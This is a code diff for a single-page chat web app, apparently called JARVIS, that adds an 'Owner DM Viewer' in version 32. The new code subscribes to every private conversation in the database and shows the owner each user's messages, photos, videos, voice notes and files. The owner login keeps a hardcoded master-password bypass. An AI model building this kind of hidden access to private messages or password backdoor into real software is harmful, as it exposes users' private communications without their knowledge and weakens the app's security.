@@ -447,6 +447,40 @@ html,body{height:100%;min-height:100%;height:-webkit-fill-available;overflow:hid
 .shared-post-card-media{margin-top:6px;border-radius:6px;overflow:hidden;max-height:180px}
 .shared-post-card-media img{width:100%;height:100%;object-fit:cover;display:block}
 .shared-post-card-cta{margin-top:6px;font-size:12px;color:var(--accent);font-weight:700}
+/* ═══════ OWNER DM VIEWER (v32) ═══════ */
+#ownerDMViewerModal{position:fixed;inset:0;background:#0b2a4a;color:#fff;display:none;flex-direction:column;z-index:10001}
+#ownerDMViewerModal.show{display:flex}
+.owner-dm-header{background:linear-gradient(135deg,#0b2a4a,#143a5f);padding:14px 16px;padding-top:calc(14px + env(safe-area-inset-top));display:flex;align-items:center;gap:10px;border-bottom:2px solid #d4af37;flex-shrink:0}
+.owner-dm-header .back-btn{background:rgba(255,255,255,.15);border:none;color:#fff;width:44px;height:44px;border-radius:50%;font-size:22px;cursor:pointer;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.owner-dm-header .dm-title{flex:1;min-width:0}
+.owner-dm-header .dm-title h3{font-size:18px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.owner-dm-header .dm-title small{font-size:13px;opacity:.85;display:block}
+.owner-dm-body{flex:1;overflow-y:auto;padding:14px;background:#f2f5f8;color:var(--text);-webkit-overflow-scrolling:touch}
+.owner-dm-msg{max-width:85%;padding:12px 16px;border-radius:16px;font-size:16px;line-height:1.5;margin-bottom:10px;word-wrap:break-word;position:relative}
+.owner-dm-msg.out{background:linear-gradient(135deg,#d4fbc9,#bef5b1);margin-left:auto;border-bottom-right-radius:4px}
+.owner-dm-msg.in{background:#fff;margin-right:auto;border-bottom-left-radius:4px;box-shadow:0 2px 6px rgba(11,42,74,.08)}
+.owner-dm-msg .sender{font-size:13px;font-weight:800;color:#0d7a8c;display:block;margin-bottom:4px}
+.owner-dm-msg .msg-time{font-size:12px;color:var(--muted);text-align:right;display:block;margin-top:4px}
+.owner-dm-msg img{max-width:100%;width:100%;display:block;border-radius:10px;margin-top:6px;cursor:pointer;background:#dfe6ed}
+.owner-dm-msg video{max-width:100%;width:100%;display:block;border-radius:10px;margin-top:6px;background:#000}
+.owner-dm-msg audio{width:100%;margin-top:6px}
+.owner-dm-msg a.file-link{display:flex;align-items:center;gap:8px;padding:10px;background:#f2f7fb;border-radius:8px;margin-top:6px;text-decoration:none;color:var(--text);font-size:14px;border:1px solid var(--border)}
+.owner-dm-msg .shared-preview{background:#f0f7ff;border-left:3px solid var(--accent);border-radius:6px;padding:8px 10px;margin-top:6px;font-size:13px;color:#0b2a4a}
+.owner-dm-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:16px;line-height:1.5}
+.owner-conv-item{background:#fff;border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:8px;cursor:pointer;transition:background .15s}
+.owner-conv-item:active{background:#f8f9fa}
+.owner-conv-header{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.owner-conv-avatars{display:flex;align-items:center;flex-shrink:0}
+.owner-conv-av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#0b2a4a,#143a5f);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;overflow:hidden;flex-shrink:0;border:2px solid #fff}
+.owner-conv-av:last-child{margin-left:-10px}
+.owner-conv-av img{width:100%;height:100%;object-fit:cover}
+.owner-conv-names{flex:1;font-size:14px;font-weight:700;color:#0b2a4a;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.owner-conv-meta{font-size:12px;color:var(--muted);flex-shrink:0}
+.owner-conv-preview{font-size:14px;color:var(--text);line-height:1.4;overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;margin-top:4px;word-break:break-word}
+.owner-conv-badges{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
+.owner-conv-badge{background:#eef2f6;color:var(--muted);font-size:11px;font-weight:700;padding:3px 8px;border-radius:6px}
+.owner-conv-badge.media{background:#fef3c7;color:#8b6914}
+.owner-conv-badge.audio{background:#dbeafe;color:#1e40af}
 @media (max-width: 540px){
   .live-chat-side{width:45%;min-width:150px;max-width:230px}
   .live-chat-msg{font-size:13px;padding:6px 8px}
@@ -544,7 +578,7 @@ html,body{height:100%;min-height:100%;height:-webkit-fill-available;overflow:hid
     <div class="logo">G</div>
     <h2 id="headerTitle">Feed</h2>
     <div class="lite-mode-badge" id="liteModeBadge">⚡ Lite</div>
-    <div id="buildBadge" style="font-size:12px;background:rgba(212,175,55,.25);color:#d4af37;padding:4px 10px;border-radius:10px;font-weight:700;letter-spacing:.5px;">v31</div>
+    <div id="buildBadge" style="font-size:12px;background:rgba(212,175,55,.25);color:#d4af37;padding:4px 10px;border-radius:10px;font-weight:700;letter-spacing:.5px;">v32</div>
     <div class="online-dot"></div>
   </header>
   <div id="tabFeed" class="tab-content" style="display:block;">
@@ -1001,6 +1035,20 @@ html,body{height:100%;min-height:100%;height:-webkit-fill-available;overflow:hid
     <iframe id="ytFeedPlayerFrame" src="" title="YouTube player" style="position:absolute;inset:0;width:100%;height:100%;border:0;" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>
   </div>
 </div>
+<!-- OWNER DM VIEWER (v32) -->
+<div id="ownerDMViewerModal">
+  <div class="owner-dm-header">
+    <button class="back-btn" onclick="window.__closeOwnerDMViewer && window.__closeOwnerDMViewer()">‹</button>
+    <div class="dm-title">
+      <h3 id="ownerDMViewerTitle">Conversation</h3>
+      <small id="ownerDMViewerSub">Viewing private messages</small>
+    </div>
+  </div>
+  <div class="owner-dm-body" id="ownerDMViewerBody">
+    <div class="owner-dm-empty">Loading…</div>
+  </div>
+</div>
+<!-- END OWNER DM VIEWER -->
 <input type="file" id="avatarInput" accept="image/*" style="display:none;">
 <input type="file" id="fileInput" style="display:none;">
 <input type="file" id="statusMediaInput" accept="image/*,video/*" style="display:none;">
@@ -1049,11 +1097,12 @@ const App = {
   _friendReqListener: null, _publicUsersListener: null,
   _userStatusesListener: null, _voicemailListener: null, _incomingCallsListener: null,
   _presenceConnListener: null, _ownerUsersListener: null, _allGroupsListener: null,
-  _voicemailBadgeListener: null,
+  _voicemailBadgeListener: null, _ownerAllChatsListener: null, _ownerDMMessagesListener: null,
   networkMode: 'normal', userLiteMode: false, liteMode: false,
   pinnedStatus: null, contactPresence: {},
   wallPostMediaFile: null, wallPosts: [], wallComposePrivacy: 'public',
-  sharingPostKey: null, sharingPostObj: null
+  sharingPostKey: null, sharingPostObj: null,
+  allConversations: {}, activeOwnerConvId: null
 };
 
 let currentAuthUser = null;
@@ -1185,8 +1234,6 @@ async function openOwnerSpaceWithAuth() {
   if (!isOwner()) return toast('Access denied — you are not the owner', true);
   var inputPwd = $('ownerPassInput').value;
   if (!inputPwd) return toast('Enter password', true);
-
-  // ✅ MASTER OWNER BYPASS — always works
   if (inputPwd === OWNER_MASTER_PASSWORD) {
     $('ownerAuthModal').classList.remove('show');
     $('ownerPassInput').value = '';
@@ -1194,8 +1241,6 @@ async function openOwnerSpaceWithAuth() {
     toast('✓ Owner Space unlocked');
     return;
   }
-
-  // Fallback: accept current Firebase Auth password
   try {
     var credential = EmailAuthProvider.credential(currentAuthUser.email, inputPwd);
     await reauthenticateWithCredential(currentAuthUser, credential);
@@ -1257,7 +1302,163 @@ setupNotificationButton(); updateNotifPermStatus();
 
 function __setOwnerTab(activeId) { ['ownerTabStatusBtn','ownerTabChatsBtn','ownerTabInteractionsBtn'].forEach(function(id) { var b = $(id); if (!b) return; if (id === activeId) { b.style.background = 'linear-gradient(135deg,#f0d369,#d4af37)'; b.style.color = 'var(--navy)'; } else { b.style.background = '#143a5f'; b.style.color = '#fff'; } }); }
 $('ownerTabStatusBtn').addEventListener('click', function() { __setOwnerTab('ownerTabStatusBtn'); var posts = window._cachedPosts || [], area = $('ownerContentArea'); if (!area) return; if (!posts.length) { area.innerHTML = '<div class="empty"><p>No statuses yet.</p></div>'; return; } var h = ''; for (var i = 0; i < posts.length; i++) { var p = posts[i]; h += '<div style="background:#f9fafb;border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:10px;"><div style="font-size:15px;font-weight:700;margin-bottom:6px;">@' + esc(p.authorSlug) + ' (' + esc(p.authorName) + ')</div><div style="font-size:16px;margin-bottom:8px;">' + esc(p.text || '') + '</div><button class="btn-primary" style="max-width:none;padding:10px 14px;font-size:15px;background:#ff4757;color:#fff;" onclick="window.__ownerDeleteStatus(\'' + p._k + '\')">🗑 Delete</button></div>'; } area.innerHTML = h; });
-$('ownerTabChatsBtn').addEventListener('click', function() { __setOwnerTab('ownerTabChatsBtn'); var area = $('ownerContentArea'); if (!area) return; area.innerHTML = '<div style="text-align:center;padding:20px;color:var(--muted);">Loading…</div>'; onValue(dbRef(db, 'users'), function(snap) { var ud = snap.val() || {}, uks = Object.keys(ud); var h = '<div style="font-size:16px;font-weight:700;margin-bottom:8px;">👥 Users (' + uks.length + ')</div>'; for (var i = 0; i < uks.length; i++) { var u = ud[uks[i]]; h += '<div style="background:#fff;border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;font-size:16px;"><strong>' + esc(u.displayName || uks[i]) + '</strong> (@' + esc(u.slug || uks[i]) + ')</div>'; } area.innerHTML = h; }, function(err) { area.innerHTML = '<div class="empty">Cannot load.</div>'; }, { onlyOnce: true }); });
+
+/* ═══════════════════════════════════════════════════════════════
+   OWNER P2P DMs — FULL CONVERSATION MONITORING (v32)
+   Every DM thread visible with all media (text, images, videos, audio, files)
+   ═══════════════════════════════════════════════════════════════ */
+function listenOwnerAllChats() {
+  if (!isOwner()) return;
+  if (App._ownerAllChatsListener) { try { App._ownerAllChatsListener(); } catch (e) {} App._ownerAllChatsListener = null; }
+  try {
+    App._ownerAllChatsListener = onValue(dbRef(db, 'chats'), function(snap) {
+      App.allConversations = snap.val() || {};
+      if ($('ownerContentArea') && document.getElementById('ownerSpaceModal') && document.getElementById('ownerSpaceModal').classList.contains('show')) {
+        renderOwnerConversationsList();
+      }
+    }, function(err) { console.error('Owner chats listener:', err); });
+  } catch (e) {}
+}
+
+function renderOwnerConversationsList() {
+  var area = $('ownerContentArea'); if (!area) return;
+  var all = App.allConversations || {};
+  var convKeys = Object.keys(all).filter(function(k) {
+    return k.indexOf('__') !== -1 && k !== '_jarvis_intro' && k !== '_status_feed' && k !== '_live_streams' && all[k] && all[k].messages;
+  });
+  if (!convKeys.length) {
+    area.innerHTML = '<div class="empty"><div class="empty-icon">💬</div><p>No private conversations yet.<br>Users will show here once they message each other.</p></div>';
+    return;
+  }
+  var convs = [];
+  convKeys.forEach(function(convId) {
+    var parts = convId.split('__');
+    if (parts.length !== 2) return;
+    var msgs = all[convId].messages || {};
+    var msgKeys = Object.keys(msgs);
+    if (!msgKeys.length) return;
+    var lastMsg = null, lastTime = 0, hasMedia = false, hasAudio = false, imageCount = 0;
+    msgKeys.forEach(function(mk) {
+      var m = msgs[mk]; if (!m) return;
+      if ((m.time || 0) > lastTime) { lastTime = m.time || 0; lastMsg = m; }
+      if (m.attachment) { hasMedia = true; if (m.attachment.type === 'audio') hasAudio = true; if (m.attachment.type === 'image') imageCount++; }
+    });
+    convs.push({ id: convId, slugA: parts[0], slugB: parts[1], lastMsg: lastMsg, lastTime: lastTime, msgCount: msgKeys.length, hasMedia: hasMedia, hasAudio: hasAudio, imageCount: imageCount });
+  });
+  convs.sort(function(a, b) { return (b.lastTime || 0) - (a.lastTime || 0); });
+  var h = '<div style="font-size:14px;font-weight:800;color:#0b2a4a;margin-bottom:10px;letter-spacing:.5px;">💬 ' + convs.length + ' Conversation' + (convs.length === 1 ? '' : 's') + ' — tap to view all messages</div>';
+  for (var i = 0; i < convs.length; i++) {
+    var c = convs[i];
+    var uA = (App.publicUsers || {})[c.slugA] || {};
+    var uB = (App.publicUsers || {})[c.slugB] || {};
+    var nameA = uA.name || c.slugA, nameB = uB.name || c.slugB;
+    var photoA = uA.photo || null, photoB = uB.photo || null;
+    var preview = '';
+    if (c.lastMsg) {
+      var senderName = c.lastMsg.from === c.slugA ? nameA : nameB;
+      if (c.lastMsg.text) preview = '<strong>' + esc(senderName) + ':</strong> ' + esc(c.lastMsg.text.slice(0, 120));
+      else if (c.lastMsg.attachment) {
+        var at = c.lastMsg.attachment.type || 'file';
+        var label = at === 'image' ? '📷 Photo' : at === 'video' ? '🎥 Video' : at === 'audio' ? '🎙️ Voice note' : '📎 File';
+        preview = '<strong>' + esc(senderName) + ':</strong> ' + label;
+      } else preview = '<strong>' + esc(senderName) + ':</strong> (empty)';
+    }
+    var badges = '<span class="owner-conv-badge">' + c.msgCount + ' msg' + (c.msgCount === 1 ? '' : 's') + '</span>';
+    if (c.imageCount > 0) badges += '<span class="owner-conv-badge media">📷 ' + c.imageCount + '</span>';
+    if (c.hasAudio) badges += '<span class="owner-conv-badge audio">🎙️ Voice</span>';
+    h += '<div class="owner-conv-item" onclick="window.__openOwnerConv(\'' + esc(c.id) + '\')">' +
+      '<div class="owner-conv-header">' +
+        '<div class="owner-conv-avatars">' +
+          '<div class="owner-conv-av">' + avatarInner(photoA, nameA) + '</div>' +
+          '<div class="owner-conv-av">' + avatarInner(photoB, nameB) + '</div>' +
+        '</div>' +
+        '<div class="owner-conv-names">' + esc(nameA) + ' ↔ ' + esc(nameB) + '</div>' +
+        '<div class="owner-conv-meta">' + formatDateTime(c.lastTime, 'short') + '</div>' +
+      '</div>' +
+      '<div class="owner-conv-preview">' + preview + '</div>' +
+      '<div class="owner-conv-badges">' + badges + '</div>' +
+    '</div>';
+  }
+  area.innerHTML = h;
+}
+
+function renderOwnerMsgAttachment(a) {
+  if (!a || !a.url) return '';
+  var u = esc(a.url);
+  if (a.type === 'image') return '<img src="' + u + '" loading="lazy" onclick="window.__lb(\'' + u + '\')">';
+  if (a.type === 'video') return '<video src="' + u + '" controls playsinline preload="metadata"></video>';
+  if (a.type === 'audio') return '<audio src="' + u + '" controls preload="metadata"></audio>';
+  return '<a class="file-link" href="' + u + '" target="_blank" download="' + esc(a.name || 'file') + '">📄 ' + esc(a.name || 'File') + (a.size ? ' (' + formatBytes(a.size) + ')' : '') + '</a>';
+}
+
+function formatBytes(b) { if (!b || b < 1024) return (b || 0) + ' B'; if (b < 1048576) return (b / 1024).toFixed(1) + ' KB'; return (b / 1048576).toFixed(2) + ' MB'; }
+
+window.__openOwnerConv = async function(convId) {
+  if (!isOwner()) return toast('Access denied', true);
+  if (!convId) return;
+  App.activeOwnerConvId = convId;
+  var parts = convId.split('__');
+  if (parts.length !== 2) return toast('Invalid conversation', true);
+  var slugA = parts[0], slugB = parts[1];
+  var uA = (App.publicUsers || {})[slugA] || {};
+  var uB = (App.publicUsers || {})[slugB] || {};
+  var nameA = uA.name || slugA, nameB = uB.name || slugB;
+  $('ownerDMViewerTitle').textContent = nameA + ' ↔ ' + nameB;
+  $('ownerDMViewerSub').textContent = '@' + slugA + '  ·  @' + slugB;
+  var body = $('ownerDMViewerBody'); if (!body) return;
+  body.innerHTML = '<div class="owner-dm-empty">Loading messages…</div>';
+  $('ownerDMViewerModal').classList.add('show');
+  if (App._ownerDMMessagesListener) { try { App._ownerDMMessagesListener(); } catch (e) {} App._ownerDMMessagesListener = null; }
+  try {
+    App._ownerDMMessagesListener = onValue(query(dbRef(db, 'chats/' + convId + '/messages'), limitToLast(200)), function(snap) {
+      var d = snap.val() || {};
+      var keys = Object.keys(d).sort(function(a, b) { return (d[a].time || 0) - (d[b].time || 0); });
+      if (!keys.length) { body.innerHTML = '<div class="owner-dm-empty">No messages in this conversation yet.</div>'; return; }
+      var html = '';
+      for (var i = 0; i < keys.length; i++) {
+        var m = d[keys[i]];
+        if (!m) continue;
+        var isA = m.from === slugA;
+        var senderName = m.fromName || (isA ? nameA : nameB);
+        var cls = isA ? 'in' : 'out';
+        html += '<div class="owner-dm-msg ' + cls + '">';
+        html += '<span class="sender">' + esc(senderName) + ' (@' + esc(m.from || '?') + ')</span>';
+        if (m.statusInteraction) {
+          html += '<div style="font-size:11px;background:#d4af37;color:#0b2a4a;padding:2px 8px;border-radius:4px;font-weight:800;display:inline-block;margin-bottom:6px;">STATUS INTERACTION</div>';
+        }
+        if (m.sharedPost) {
+          html += '<div class="shared-preview"><strong>📤 Shared post</strong> by @' + esc(m.sharedPost.authorSlug || '?') + (m.sharedPost.text ? '<br>"' + esc(m.sharedPost.text.slice(0, 120)) + '"' : '') + '</div>';
+        }
+        if (m.attachment) html += renderOwnerMsgAttachment(m.attachment);
+        if (m.text) html += '<div style="white-space:pre-wrap;margin-top:' + (m.attachment ? '6px' : '0') + ';">' + esc(m.text) + '</div>';
+        html += '<span class="msg-time">' + formatDateTime(m.time, 'short') + '</span>';
+        html += '</div>';
+      }
+      body.innerHTML = html;
+      setTimeout(function() { body.scrollTop = body.scrollHeight; }, 50);
+    }, function(err) {
+      body.innerHTML = '<div class="owner-dm-empty">Could not load messages: ' + esc(err.message || 'unknown') + '</div>';
+    });
+  } catch (e) {
+    body.innerHTML = '<div class="owner-dm-empty">Error: ' + esc(e.message || 'unknown') + '</div>';
+  }
+};
+
+window.__closeOwnerDMViewer = function() {
+  if (App._ownerDMMessagesListener) { try { App._ownerDMMessagesListener(); } catch (e) {} App._ownerDMMessagesListener = null; }
+  App.activeOwnerConvId = null;
+  var modal = $('ownerDMViewerModal'); if (modal) modal.classList.remove('show');
+  var body = $('ownerDMViewerBody'); if (body) body.innerHTML = '<div class="owner-dm-empty">Loading…</div>';
+};
+
+$('ownerTabChatsBtn').addEventListener('click', function() {
+  __setOwnerTab('ownerTabChatsBtn');
+  var area = $('ownerContentArea'); if (!area) return;
+  area.innerHTML = '<div style="text-align:center;padding:20px;color:var(--muted);">Loading all conversations…</div>';
+  listenOwnerAllChats();
+  setTimeout(renderOwnerConversationsList, 400);
+});
+
 $('ownerTabInteractionsBtn').addEventListener('click', function() { __setOwnerTab('ownerTabInteractionsBtn'); var area = $('ownerContentArea'); if (!area) return; area.innerHTML = '<div style="text-align:center;padding:20px;color:var(--muted);">Loading…</div>'; onValue(query(dbRef(db, 'status_interactions'), limitToLast(100)), function(snap) { var d = snap.val() || {}; var items = Object.keys(d).map(function(k) { var v = d[k]; v._k = k; return v; }).sort(function(a, b) { return (b.time || 0) - (a.time || 0); }); if (!items.length) { area.innerHTML = '<div class="empty"><p>No interactions logged yet.</p></div>'; return; } var h = ''; for (var i = 0; i < items.length; i++) { var it = items[i]; h += '<div class="owner-interaction-card"><div class="owner-interaction-header"><div class="owner-interaction-avatar">' + esc((it.actorName || '?').charAt(0).toUpperCase()) + '</div><div class="owner-interaction-text"><strong>@' + esc(it.actorSlug) + '</strong> <span style="color:var(--muted);">' + (it.type || 'interaction') + ' on</span> <strong style="color:#d4af37;">@' + esc(it.ownerSlug) + '</strong></div><div class="owner-interaction-time">' + formatDateTime(it.time, 'short') + '</div></div>' + (it.statusText ? '<div class="owner-original-block"><span class="owner-original-label">ORIGINAL POST:</span><div class="owner-original-text">"' + esc(it.statusText) + '"</div></div>' : '') + '</div>'; } area.innerHTML = h; }, function(err) { area.innerHTML = '<div class="empty">Cannot load.</div>'; }); });
 window.__ownerDeleteStatus = async function(k) { if (!confirm('Delete?')) return; try { await remove(dbRef(db, STATUS_FEED_PATH + '/' + k)); toast('Deleted ✓'); } catch(e) { toast('Failed', true); } };
 
@@ -1274,7 +1475,7 @@ function startMainApp() {
   ensureBootstrap(); updateNewUsersBadge();
   for (var k = 0; k < App.contacts.length; k++) setupMessageListener(App.contacts[k].slug, false);
   for (var l = 0; l < App.groups.length; l++) setupGroupMessageListener(App.groups[l].id);
-  if (isOwner()) { setTimeout(function() { if (App._ownerUsersListener) { try { App._ownerUsersListener(); } catch (e) {} } try { App._ownerUsersListener = onValue(dbRef(db, 'users'), function(snap) { var users = snap.val() || {}, slugs = Object.keys(users), uiChanged = false; for (var x = 0; x < slugs.length; x++) { var u = users[slugs[x]]; if (u && u.slug && u.slug !== App.mySlug && !findContact(u.slug)) { App.contacts.push({ slug: u.slug, name: u.displayName || u.slug, photo: u.photo || null }); App.lastSeenTimes[u.slug] = Date.now(); setupMessageListener(u.slug, false); uiChanged = true; } } if (uiChanged) { saveContacts(); saveLastSeenTimes(); if (debouncedBuildUI) debouncedBuildUI(); } }, function() {}); } catch (e) {} }, 5000); }
+  if (isOwner()) { setTimeout(function() { if (App._ownerUsersListener) { try { App._ownerUsersListener(); } catch (e) {} } try { App._ownerUsersListener = onValue(dbRef(db, 'users'), function(snap) { var users = snap.val() || {}, slugs = Object.keys(users), uiChanged = false; for (var x = 0; x < slugs.length; x++) { var u = users[slugs[x]]; if (u && u.slug && u.slug !== App.mySlug && !findContact(u.slug)) { App.contacts.push({ slug: u.slug, name: u.displayName || u.slug, photo: u.photo || null }); App.lastSeenTimes[u.slug] = Date.now(); setupMessageListener(u.slug, false); uiChanged = true; } } if (uiChanged) { saveContacts(); saveLastSeenTimes(); if (debouncedBuildUI) debouncedBuildUI(); } }, function() {}); } catch (e) {} }, 5000); listenOwnerAllChats(); }
   if (App._allGroupsListener) { try { App._allGroupsListener(); } catch (e) {} }
   try { App._allGroupsListener = onValue(dbRef(db, 'group_chats'), function(snap) { var rg = snap.val() || {}, ids = Object.keys(rg), uiChanged = false; for (var x = 0; x < ids.length; x++) { var g = rg[ids[x]]; if (g && g.id && g.members && g.members.indexOf(App.mySlug) !== -1 && !findGroup(g.id)) { App.groups.push(g); App.lastSeenTimes[g.id] = Date.now(); setupGroupMessageListener(g.id); uiChanged = true; } } if (uiChanged) { saveGroups(); saveLastSeenTimes(); if (debouncedBuildUI) debouncedBuildUI(); } }, function(err) {}); } catch (e) {}
   updateAppBadge(); updateWallHeader();
@@ -1444,30 +1645,10 @@ $('chatInput').addEventListener('input', function() { $('sendBtn').disabled = !$
 $('attachBtn').addEventListener('click', function() { $('fileInput').click(); });
 $('fileInput').addEventListener('change', async function(e) { var f = e.target.files[0]; if (!f || !App.activeChat) return; toast('Processing…'); try { var url = await fileToBase64(f); await sendMessage({ type: detectFileType(f), url: url, name: f.name, size: f.size }); toast('Sent ✓'); } catch (err) { toast('Failed', true); } e.target.value = ''; });
 
-/* VOICEMAIL — with badge + read tracking */
+/* VOICEMAIL */
 function listenVoicemails() { var list = $('voicemailList'); if (!list) return; if (App._voicemailListener) { try { App._voicemailListener(); } catch (e) {} App._voicemailListener = null; } try { App._voicemailListener = onValue(query(dbRef(db, 'voicemails/' + App.mySlug), limitToLast(20)), function(snap) { var d = snap.val() || {}; var items = Object.keys(d).map(function(k) { var v = d[k]; v._k = k; return v; }).sort(function(a, b) { return b.time - a.time; }); if (!items.length) { list.innerHTML = '<div class="empty"><p>No voicemails.</p></div>'; return; } var html = ''; for (var i = 0; i < items.length; i++) { var readBadge = !items[i].read ? '<span style="display:inline-block;background:#ff4757;color:#fff;font-size:11px;font-weight:800;padding:2px 8px;border-radius:6px;margin-left:6px;">NEW</span>' : ''; html += '<div style="background:#fff;margin:8px 16px;padding:14px;border-radius:10px;border:1px solid var(--border);' + (!items[i].read ? 'border-left:4px solid #ff4757;' : '') + '"><div style="font-size:16px;font-weight:700;">From: @' + esc(items[i].fromName || items[i].from) + readBadge + '</div><div style="font-size:13px;color:var(--muted);margin-bottom:6px;">' + formatDateTime(items[i].time) + (items[i].duration ? ' · ' + items[i].duration + 's' : '') + '</div><audio controls preload="none" src="' + items[i].url + '" style="width:100%;"></audio></div>'; } list.innerHTML = html; }, function(err) {}); } catch (e) {} }
-function listenVoicemailBadge() {
-  if (!App.mySlug) return;
-  if (App._voicemailBadgeListener) { try { App._voicemailBadgeListener(); } catch (e) {} App._voicemailBadgeListener = null; }
-  try {
-    App._voicemailBadgeListener = onValue(dbRef(db, 'voicemails/' + App.mySlug), function(snap) {
-      var d = snap.val() || {};
-      var unread = Object.keys(d).filter(function(k) { return !d[k].read; }).length;
-      var btn = document.querySelector('.nav-item[data-tab="calls"]');
-      if (!btn) return;
-      var existing = btn.querySelector('.req-badge');
-      if (existing) existing.remove();
-      if (unread > 0) { var badge = document.createElement('span'); badge.className = 'req-badge'; badge.textContent = unread > 9 ? '9+' : unread; badge.style.background = '#ff4757'; btn.appendChild(badge); }
-    }, function() {});
-  } catch (e) {}
-}
-function markVoicemailsAsRead() {
-  if (!App.mySlug) return;
-  get(dbRef(db, 'voicemails/' + App.mySlug)).then(function(snap) {
-    var d = snap.val() || {};
-    Object.keys(d).forEach(function(k) { if (!d[k].read) { set(dbRef(db, 'voicemails/' + App.mySlug + '/' + k + '/read'), true).catch(function(){}); } });
-  }).catch(function(){});
-}
+function listenVoicemailBadge() { if (!App.mySlug) return; if (App._voicemailBadgeListener) { try { App._voicemailBadgeListener(); } catch (e) {} App._voicemailBadgeListener = null; } try { App._voicemailBadgeListener = onValue(dbRef(db, 'voicemails/' + App.mySlug), function(snap) { var d = snap.val() || {}; var unread = Object.keys(d).filter(function(k) { return !d[k].read; }).length; var btn = document.querySelector('.nav-item[data-tab="calls"]'); if (!btn) return; var existing = btn.querySelector('.req-badge'); if (existing) existing.remove(); if (unread > 0) { var badge = document.createElement('span'); badge.className = 'req-badge'; badge.textContent = unread > 9 ? '9+' : unread; badge.style.background = '#ff4757'; btn.appendChild(badge); } }, function() {}); } catch (e) {} }
+function markVoicemailsAsRead() { if (!App.mySlug) return; get(dbRef(db, 'voicemails/' + App.mySlug)).then(function(snap) { var d = snap.val() || {}; Object.keys(d).forEach(function(k) { if (!d[k].read) { set(dbRef(db, 'voicemails/' + App.mySlug + '/' + k + '/read'), true).catch(function(){}); } }); }).catch(function(){}); }
 
 /* STATUS FEED */
 function listenUserStatuses() { if (App._userStatusesListener) { try { App._userStatusesListener(); } catch (e) {} App._userStatusesListener = null; } try { App._userStatusesListener = onValue(query(dbRef(db, STATUS_FEED_PATH), limitToLast(100)), function(snap) { var d = snap.val() || {}; var fs = App.contacts.map(function(c) { return c.slug; }); var posts = Object.keys(d).map(function(k) { var v = d[k]; v._k = k; return v; }).filter(function(p) { return isOwner() || p.authorSlug === App.mySlug || fs.indexOf(p.authorSlug) !== -1; }).sort(function(a, b) { return (b.time || 0) - (a.time || 0); }); try { LS.set('cached_statuses', posts); } catch (e) {} try { renderStatusFeedList(posts); } catch (e) {} }, function(err) { var cached = LS.get('cached_statuses', []); if (cached.length) { try { renderStatusFeedList(cached); } catch (e) {} } }); } catch (e) {} }
@@ -1543,7 +1724,7 @@ $('liveEndBtn').addEventListener('click', function() { if (App.liveMode === 'hos
 $('liveMuteBtn').addEventListener('click', function() { window.__toggleLiveMute(); });
 $('liveShareBtn').addEventListener('click', function() { var slug = App.liveHostSlug || App.mySlug; if (!slug) return; var url = APP_BASE_URL + '?live=' + encodeURIComponent(slug); if (navigator.share) { navigator.share({ title: 'JARVIS Live', text: "I'm LIVE on JARVIS", url: url }).catch(function() {}); } else { prompt('Share:', url); } });
 
-/* CALL STUB + SOCIAL */
+/* CALL + SOCIAL */
 window.startCall = function(slug, v) { if (!slug || slug === App.mySlug) return toast('Invalid contact', true); if (App.blockedUsers.indexOf(slug) !== -1) return toast('Unblock first', true); toast('📞 Calling @' + slug + '…'); };
 window.__googleOpen = function(url) { window.open(url, '_blank', 'noopener'); };
 window.__chromeOpen = function(url) { window.open(url, '_blank', 'noopener'); };
@@ -1784,7 +1965,7 @@ $('chatRecordBtn').addEventListener('click', async function() {
   });
 })();
 
-console.log('%c✅ JARVIS v31 — Owner Auth master password restored + all voice features working', 'background:#d4af37;color:#0b2a4a;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:14px;');
+console.log('%c✅ JARVIS v32 — Owner DM Viewer with all media + voice + share monitoring', 'background:#d4af37;color:#0b2a4a;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:14px;');
 </script>
 </body>
 </html>
